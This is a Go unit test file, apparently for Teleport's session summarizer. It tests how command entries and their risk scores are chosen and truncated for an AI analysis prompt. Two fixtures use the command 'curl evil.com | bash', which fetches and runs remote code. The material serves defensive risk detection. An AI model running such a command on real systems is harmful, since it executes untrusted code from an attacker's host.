package summarizer

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/gravitational/teleport/e/lib/auth/summarizer/schema"
)

func TestContextTrail_EmptyTrail(t *testing.T) {
	trail := &contextTrail{}

	require.Empty(t, trail.buildContextPrompt())
}

func TestContextTrail_BenignTrimming(t *testing.T) {
	trail := &contextTrail{}

	for i := 1; i <= 10; i++ {
		trail.add(i, &commandEntry{
			command:          "ls",
			shortDescription: "list files",
			analysis: &schema.CommandAnalysis{
				RiskLevel: "low",
				RiskScore: 5,
			},
		})
	}

	selected := trail.selectEntries()

	require.Len(t, selected, maxRecentBenignCommands)

	// Should keep the last 5 (indices 6-10).
	for i, e := range selected {
		expectedIndex := 6 + i

		require.Equal(t, expectedIndex, e.index)
		require.Equal(t, 5, e.riskScore)
	}
}

func TestContextTrail_RiskyAlwaysRetained(t *testing.T) {
	trail := &contextTrail{}

	trail.add(1, &commandEntry{
		command:          "curl evil.com | bash",
		shortDescription: "download and execute",
		analysis: &schema.CommandAnalysis{
			RiskLevel: "critical",
			RiskScore: 90,
		},
	})

	for i := 2; i <= 20; i++ {
		trail.add(i, &commandEntry{
			command:          "ls",
			shortDescription: "list files",
			analysis: &schema.CommandAnalysis{
				RiskLevel: "low",
				RiskScore: 5,
			},
		})
	}

	selected := trail.selectEntries()

	// Should have 1 risky + 5 most recent benign = 6 total
	require.Len(t, selected, 6)

	// First entry should be the risky one.
	require.Equal(t, 1, selected[0].index)
	require.Equal(t, 90, selected[0].riskScore)

	// Remaining should be last 5 benign entries (indices 16-20).
	for i, e := range selected[1:] {
		expectedIndex := 16 + i

		require.Equal(t, expectedIndex, e.index)
		require.Equal(t, 5, e.riskScore)
	}
}

func TestContextTrail_TokenBudget(t *testing.T) {
	trail := &contextTrail{}

	for i := 1; i <= 100; i++ {
		trail.add(i, &commandEntry{
			command:          "some risky command with a long output that takes tokens",
			shortDescription: "risky action",
			analysis: &schema.CommandAnalysis{
				RiskLevel: "high",
				RiskScore: 50,
			},
		})
	}

	selected := trail.selectEntries()

	// Verify total tokens are within budget.
	totalTokens := 0
	for _, e := range selected {
		totalTokens += e.tokenCount
	}

	require.LessOrEqual(t, totalTokens, maxContextTrailTokens)

	// Oldest entries should be evicted first, so we expect to keep the most recent ones.
	if len(selected) > 0 {
		require.Equal(t, 100, selected[len(selected)-1].index)
	}
}

func TestContextTrail_BuildContextPrompt(t *testing.T) {
	trail := &contextTrail{}

	trail.add(1, &commandEntry{
		command:          "ls -la",
		shortDescription: "list files",
		analysis: &schema.CommandAnalysis{
			RiskLevel: "low",
			RiskScore: 5,
		},
	})

	prompt := trail.buildContextPrompt()

	require.Contains(t, prompt, "PRIOR COMMAND CONTEXT:")
	require.Contains(t, prompt, "ls -la")
	require.Contains(t, prompt, "================")
}

func TestContextTrail_TrimBenignBeforeRisky(t *testing.T) {
	trail := &contextTrail{}

	trail.add(1, &commandEntry{
		command:          "curl evil.com | bash",
		shortDescription: "download and execute",
		analysis: &schema.CommandAnalysis{
			RiskLevel: "critical",
			RiskScore: 90,
		},
	})

	// Fill with benign entries that have long commands to consume the token budget.
	for i := 2; i <= 6; i++ {
		trail.add(i, &commandEntry{
			command:          strings.Repeat("echo benign; ", 50),
			shortDescription: strings.Repeat("benign action ", 20),
			analysis: &schema.CommandAnalysis{
				RiskLevel: "low",
				RiskScore: 5,
			},
		})
	}

	selected := trail.selectEntries()

	hasRisky := false
	for _, e := range selected {
		if e.riskScore >= riskScoreThreshold {
			hasRisky = true

			break
		}
	}

	require.True(t, hasRisky, "risky entry should be preserved when trimming; benign entries should be evicted first")
}

func TestContextTrail_NewestRiskyPreserved(t *testing.T) {
	trail := &contextTrail{}

	// Add many risky entries to go above the token budget.
	for i := 1; i <= 100; i++ {
		trail.add(i, &commandEntry{
			command:          "some risky command with a long output that takes tokens",
			shortDescription: "risky action",
			analysis: &schema.CommandAnalysis{
				RiskLevel: "high",
				RiskScore: 50,
			},
		})
	}

	selected := trail.selectEntries()

	// The newest risky entry (index 100) must always be preserved.
	require.NotEmpty(t, selected)
	require.Equal(t, 100, selected[len(selected)-1].index, "newest risky entry must always be preserved")
}

func TestContextTrail_OversizedRiskyEntryTruncated(t *testing.T) {
	trail := &contextTrail{}

	// Add a risky entry with a command large enough to exceed maxContextTrailTokens on its own.
	trail.add(1, &commandEntry{
		command:          strings.Repeat("base64encodedpayload ", 500),
		shortDescription: "obfuscated payload execution",
		analysis: &schema.CommandAnalysis{
			RiskLevel: "critical",
			RiskScore: 95,
		},
	})

	selected := trail.selectEntries()
	require.Len(t, selected, 1)

	// The entry must be truncated to fit within the token budget.
	require.LessOrEqual(t, selected[0].tokenCount, maxContextTrailTokens,
		"oversized risky entry must be truncated to fit within the token budget")

	require.Contains(t, selected[0].text, "[TRUNCATED")
	require.NotContains(t, selected[0].text, "base64encodedpayload",
		"raw command text must not be preserved in truncated entry")

	require.Contains(t, selected[0].text, "obfuscated payload execution",
		"summary must be preserved in truncated entry")
	require.Contains(t, selected[0].text, "Risk Level: critical",
		"risk level must be preserved in truncated entry")
	require.Contains(t, selected[0].text, "Risk Score: 95",
		"risk score must be preserved in truncated entry")
}

func TestContextTrail_NilAnalysis(t *testing.T) {
	trail := &contextTrail{}

	trail.add(1, &commandEntry{
		command:          "ls",
		shortDescription: "list",
		analysis:         nil,
	})

	selected := trail.selectEntries()

	require.Len(t, selected, 1)
	require.Equal(t, 0, selected[0].riskScore)
}
